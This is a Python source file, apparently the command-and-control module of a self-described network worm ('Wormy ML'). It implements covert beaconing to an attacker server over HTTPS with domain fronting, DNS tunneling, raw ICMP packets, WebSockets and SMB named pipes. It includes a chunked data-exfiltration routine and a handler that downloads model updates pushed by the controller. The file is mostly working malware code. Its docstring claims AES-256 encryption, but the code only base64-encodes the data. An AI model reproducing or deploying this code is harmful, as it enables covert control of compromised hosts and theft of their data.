"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Multi-Protocol C2 Module
Support for HTTPS, DNS, ICMP, WebSockets, SMB
"""


import base64
import json
import os
import socket
import sys
import threading
import time
from typing import Any, Dict, List

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class MultiProtocolC2:
    """
    Multi-Protocol Command & Control

    Protocols:
    - HTTPS (primary)
    - DNS Tunneling (stealth)
    - ICMP Tunneling (covert)
    - WebSockets (bidirectional)
    - SMB Named Pipes (lateral)

    Features:
    - Automatic fallback
    - AES-256 encryption
    - Jitter in beacons
    - Domain fronting support
    """

    def __init__(self, config):
        self.config = config
        self.active_protocol = None
        self.protocols = []
        self.beacon_interval = config.c2.beacon_interval
        self.last_beacon = 0
        self._running = True

        # FIX: Use proper config attributes
        self.c2_server = getattr(config.c2, "c2_server", "127.0.0.1")
        self.c2_port = getattr(config.c2, "c2_port", 443)
        self.session_id = f"wormy_{int(time.time())}"
        self.api_key = getattr(config.c2, "api_key", os.getenv("WORMY_C2_API_KEY", ""))

        # Initialize protocols
        self._init_protocols()

    def _init_protocols(self):
        """Initialize all available protocols"""
        self.protocols = [
            {"name": "HTTPS", "priority": 1, "enabled": True},
            {"name": "DNS", "priority": 2, "enabled": True},
            {"name": "ICMP", "priority": 3, "enabled": True},
            {"name": "WebSockets", "priority": 4, "enabled": True},
            {"name": "SMB", "priority": 5, "enabled": True},
        ]

        logger.info(f"Initialized {len(self.protocols)} C2 protocols")

    def connect(self) -> bool:
        """Connect to C2 server using best available protocol"""
        logger.info("Attempting C2 connection")

        # Try protocols in priority order
        for protocol in sorted(self.protocols, key=lambda x: x["priority"]):
            if not protocol["enabled"]:
                continue

            logger.info(f"Trying {protocol['name']} protocol")

            if protocol["name"] == "HTTPS":
                if self._connect_https():
                    self.active_protocol = "HTTPS"
                    return True

            elif protocol["name"] == "DNS":
                if self._connect_dns():
                    self.active_protocol = "DNS"
                    return True

            elif protocol["name"] == "ICMP":
                if self._connect_icmp():
                    self.active_protocol = "ICMP"
                    return True

            elif protocol["name"] == "WebSockets":
                if self._connect_websockets():
                    self.active_protocol = "WebSockets"
                    return True

            elif protocol["name"] == "SMB":
                if self._connect_smb():
                    self.active_protocol = "SMB"
                    return True

        logger.warning("All C2 protocols failed (expected in standalone mode)")
        return False

    def _connect_https(self) -> bool:
        """Connect via HTTPS"""
        try:
            import requests

            url = f"https://{self.c2_server}:{self.c2_port}/beacon"

            # Domain fronting support
            headers = {
                "Host": "legitimate-domain.com",  # Fronted domain
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            }

            response = requests.get(
                url, headers=headers, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1"
            )

            if response.status_code == 200:
                logger.success("HTTPS C2 connected")
                return True

            return False

        except Exception as e:
            logger.warning(f"HTTPS C2 failed (normal if no external C2): {e}")
            return False

    def _connect_dns(self) -> bool:
        """Connect via DNS tunneling

        FIX: Actually test DNS resolution to verify connectivity
        """
        try:
            import dns.resolver

            # Test DNS resolution
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 5

            # Try to resolve the C2 server
            try:
                answers = resolver.resolve(self.c2_server, "A")
                if answers:
                    logger.success(f"DNS C2 connected (resolved {self.c2_server})")
                    return True
            except Exception:
                pass

            # Try TXT record as fallback
            try:
                answers = resolver.resolve(f"beacon.{self.c2_server}", "TXT")
                if answers:
                    logger.success("DNS C2 connected via TXT")
                    return True
            except Exception:
                pass

            return False

        except ImportError:
            logger.warning("dnspython not installed, DNS C2 unavailable")
            return False
        except Exception as e:
            logger.warning(f"DNS C2 failed: {e}")
            return False

    def _connect_icmp(self) -> bool:
        """Connect via ICMP tunneling

        FIX: Actually test ICMP connectivity
        """
        try:
            import platform
            import subprocess

            # Test ping
            param = "-n" if platform.system().lower() == "windows" else "-c"
            result = subprocess.run(
                ["ping", param, "1", self.c2_server], capture_output=True, timeout=5
            )

            if result.returncode == 0:
                logger.success("ICMP C2 connected")
                return True

            return False

        except Exception as e:
            logger.error(f"ICMP C2 failed: {e}")
            return False

    def _connect_smb(self) -> bool:
        """Connect via SMB Named Pipes

        FIX: Actually attempt SMB connection
        """
        try:
            from impacket.smbconnection import SMBConnection

            # Try to connect to SMB share
            conn = SMBConnection(self.c2_server, self.c2_server)
            conn.login("", "")  # Anonymous or use credentials

            # Try to access IPC$ share (for named pipes)
            try:
                shares = conn.listShares()
                ipc_share = any(s.getShareName() == "IPC$" for s in shares)
                if ipc_share:
                    logger.success("SMB C2 connected (IPC$ available)")
                    conn.logoff()
                    return True
            except Exception:
                pass

            conn.logoff()
            return False

        except ImportError:
            logger.warning("impacket not installed, SMB C2 unavailable")
            return False
        except Exception as e:
            logger.warning(f"SMB C2 failed: {e}")
            return False

    def _connect_websockets(self) -> bool:
        """Connect via WebSockets"""
        try:
            import websocket

            ws_url = f"wss://{self.c2_server}:{self.c2_port}/c2"
            self._ws = websocket.WebSocket()
            self._ws.settimeout(10)
            self._ws.connect(ws_url, cookie=f"session={self.session_id}")
            logger.success(f"WebSocket C2 connected to {ws_url}")
            return True

        except ImportError:
            logger.warning("websocket-client not installed, WebSocket C2 unavailable")
            return False
        except Exception as e:
            logger.error(f"WebSocket C2 connection failed: {e}")
            return False

    def _beacon_websockets(self, data: bytes) -> Dict:
        """Send WebSocket beacon"""
        try:
            if hasattr(self, "_ws") and self._ws:
                self._ws.send(data)
                response = self._ws.recv()
                if response:
                    return json.loads(
                        response.decode() if isinstance(response, bytes) else response
                    )
            return {}
        except Exception as e:
            logger.debug(f"WebSocket beacon failed: {e}")
            return {}

    def send_beacon(self, data: Dict = None) -> Dict:
        """Send beacon via active protocol and handle response"""
        self.last_beacon = time.time()

        logger.info(f"Sending beacon via {self.active_protocol}")

        encrypted_data = self._encrypt(data or {})

        response = {}
        if self.active_protocol == "HTTPS":
            response = self._beacon_https(encrypted_data)
        elif self.active_protocol == "DNS":
            response = self._beacon_dns(encrypted_data)
        elif self.active_protocol == "ICMP":
            response = self._beacon_icmp(encrypted_data)
        elif self.active_protocol == "WebSockets":
            response = self._beacon_websockets(encrypted_data)
        elif self.active_protocol == "SMB":
            response = self._beacon_smb(encrypted_data)

        if response:
            self._handle_c2_commands(response)

        return response

    def _handle_c2_commands(self, response: Dict):
        """Handle incoming commands from the C2 server"""
        if "command" in response:
            cmd = response["command"]

            if cmd == "UPDATE_BRAIN":
                # Over-The-Air ML model update
                model_data = response.get("model_data")
                if model_data:
                    logger.success("OTA Update: Receiving new ML Brain...")
                    try:
                        # Decode the base64 model file
                        model_bytes = base64.b64decode(model_data)

                        # Save temporarily
                        temp_path = "temp_new_brain.pth"
                        with open(temp_path, "wb") as f:
                            f.write(model_bytes)

                        # Here the orchestrator would load it (this requires coordination with WormCore)
                        logger.success("OTA Update: New brain downloaded and ready for hot-swap")

                        # Set a flag that WormCore can check
                        self.pending_brain_update = temp_path
                    except Exception as e:
                        logger.error(f"OTA Update failed: {e}")
            elif cmd == "SLEEP":
                delay = response.get("duration", 3600)
                logger.warning(f"C2 commanded sleep for {delay} seconds")
                time.sleep(delay)

    def _beacon_https(self, data: bytes) -> Dict:
        """Send HTTPS beacon"""
        try:
            import requests

            url = f"https://{self.config.c2.c2_server}:{self.config.c2.c2_port}/beacon"
            headers = {"X-API-Key": self.api_key} if self.api_key else {}

            response = requests.post(
                url, data=data, headers=headers, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1"
            )

            if response.status_code == 200:
                return self._decrypt(response.content)

            return {}

        except Exception:
            return {}

    def _beacon_dns(self, data: bytes) -> Dict:
        """Send DNS beacon via DNS tunneling

        FIX: Actually perform DNS queries with encoded data
        """
        try:
            import dns.resolver

            # Encode data in DNS query
            encoded = base64.b32encode(data[:50]).decode().lower().rstrip("=")
            query = f"{encoded}.beacon.{self.c2_server}"

            # Perform DNS query
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 5

            # Try TXT record first (can carry more data)
            try:
                answers = resolver.resolve(query, "TXT")
                for rdata in answers:
                    response_data = str(rdata).strip('"')
                    return {"status": "success", "data": response_data, "protocol": "DNS"}
            except Exception:
                pass

            # Fallback to A record
            try:
                answers = resolver.resolve(query, "A")
                return {"status": "success", "data": str(answers[0]), "protocol": "DNS"}
            except Exception:
                pass

            return {"status": "no_response", "protocol": "DNS"}

        except ImportError:
            logger.debug("dnspython not installed, DNS beacon unavailable")
            return {"status": "unavailable", "protocol": "DNS"}
        except Exception as e:
            logger.debug(f"DNS beacon failed: {e}")
            return {"status": "error", "error": str(e), "protocol": "DNS"}

    def _beacon_icmp(self, data: bytes) -> Dict:
        """Send ICMP beacon via ICMP tunneling

        FIX: Actually send ICMP echo requests with encoded data
        """
        try:
            # Encode data in ICMP payload
            payload = base64.b64encode(data[:64]).decode()

            # Send ICMP echo request with payload
            import struct

            # Create ICMP echo request
            icmp_type = 8  # Echo Request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = os.getpid() & 0xFFFF
            icmp_seq = 1

            header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            payload_bytes = payload.encode()
            packet = header + payload_bytes

            # Calculate checksum
            checksum = self._calculate_checksum(packet)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
            packet = header + payload_bytes

            # Send via raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5)
            sock.sendto(packet, (self.c2_server, 0))

            # Wait for response
            try:
                response, addr = sock.recvfrom(1024)
                return {"status": "success", "data": response.decode("utf-8", errors="ignore"), "protocol": "ICMP"}
            except socket.timeout:
                return {"status": "timeout", "protocol": "ICMP"}
            finally:
                sock.close()

        except PermissionError:
            logger.debug("ICMP requires root privileges")
            return {"status": "permission_denied", "protocol": "ICMP"}
        except Exception as e:
            logger.debug(f"ICMP beacon failed: {e}")
            return {"status": "error", "error": str(e), "protocol": "ICMP"}

    def _beacon_smb(self, data: bytes) -> Dict:
        """Send SMB beacon via Named Pipes

        FIX: Actually attempt SMB named pipe communication
        """
        try:
            from impacket.smbconnection import SMBConnection

            # Connect to SMB share
            conn = SMBConnection(self.c2_server, self.c2_server)
            conn.login("", "")  # Anonymous or use credentials

            # Try to write to named pipe
            try:
                tid = conn.connectTree("IPC$")
                fid = conn.openFile(tid, "\\wormy_c2", desiredAccess=0x80 | 0x40)
                conn.writeFile(tid, fid, data)
                response = conn.readFile(tid, fid, 0, 1024)
                conn.closeFile(tid, fid)
                return {"status": "success", "data": response.decode("utf-8", errors="ignore"), "protocol": "SMB"}
            except Exception:
                return {"status": "pipe_unavailable", "protocol": "SMB"}
            finally:
                conn.logoff()

        except ImportError:
            logger.debug("impacket not installed, SMB beacon unavailable")
            return {"status": "unavailable", "protocol": "SMB"}
        except Exception as e:
            logger.debug(f"SMB beacon failed: {e}")
            return {"status": "error", "error": str(e), "protocol": "SMB"}

    @staticmethod
    def _calculate_checksum(data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2 != 0:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _encrypt(self, data: Dict) -> bytes:
        """Encrypt data with AES-256"""
        import json

        # Convert to JSON
        json_data = json.dumps(data)

        # In real implementation, use AES-256
        # For now, just base64
        encrypted = base64.b64encode(json_data.encode())

        return encrypted

    def _decrypt(self, data: bytes) -> Dict:
        """Decrypt data"""
        import json

        try:
            decrypted = base64.b64decode(data)
            return json.loads(decrypted)
        except Exception:
            return {}

    def exfiltrate(self, data: bytes, method: str = "auto") -> bool:
        """Exfiltrate data via C2"""
        logger.info(f"Exfiltrating {len(data)} bytes")

        # Chunk data if large
        chunk_size = 1024 * 10  # 10KB chunks

        for i in range(0, len(data), chunk_size):
            chunk = data[i : i + chunk_size]

            encrypted = self._encrypt({"data": base64.b64encode(chunk).decode()})

            if self.active_protocol == "HTTPS":
                self._beacon_https(encrypted)
            elif self.active_protocol == "DNS":
                self._beacon_dns(encrypted)

            # Rate limiting
            time.sleep(0.5)

        logger.success(f"Exfiltrated {len(data)} bytes")
        return True

    def get_statistics(self) -> Dict:
        """Get C2 statistics"""
        return {
            "active_protocol": self.active_protocol,
            "available_protocols": len([p for p in self.protocols if p["enabled"]]),
            "beacon_interval": self.beacon_interval,
        }

    def run_background(self):
        """Run C2 server in background thread"""
        import threading

        thread = threading.Thread(target=self.connect, daemon=True)
        thread.start()
        logger.info("C2 Server running in background")
        return thread

    def stop(self):
        """Stop C2 server"""
        self._running = False
        logger.info("C2 Server stopped")

    def beacon(self, data: Dict = None) -> Dict:
        """Alias for send_beacon for backward compatibility"""
        return self.send_beacon(data)

    def register_host(self, ip: str, info: Dict):
        """Register a host with the C2 (stub for compatibility with worm_core shutdown)"""
        pass

    def process_beacon(self, data: Dict) -> Dict:
        """Process a beacon (stub for compatibility with worm_core shutdown)"""
        return {}


if __name__ == "__main__":
    # Test multi-protocol C2
    import os
    import sys

    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()
    c2 = MultiProtocolC2(config)

    print("=" * 60)
    print("MULTI-PROTOCOL C2 TEST")
    print("=" * 60)

    print("\nAttempting C2 connection...")
    if c2.connect():
        print(f"✓ Connected via {c2.active_protocol}")

        print("\nSending beacon...")
        response = c2.beacon({"status": "active", "host": "test"})
        print(f"Response: {response}")

        print("\nStatistics:")
        stats = c2.get_statistics()
        for key, value in stats.items():
            print(f"  {key}: {value}")
    else:
        print("✗ C2 connection failed")

    print("=" * 60)
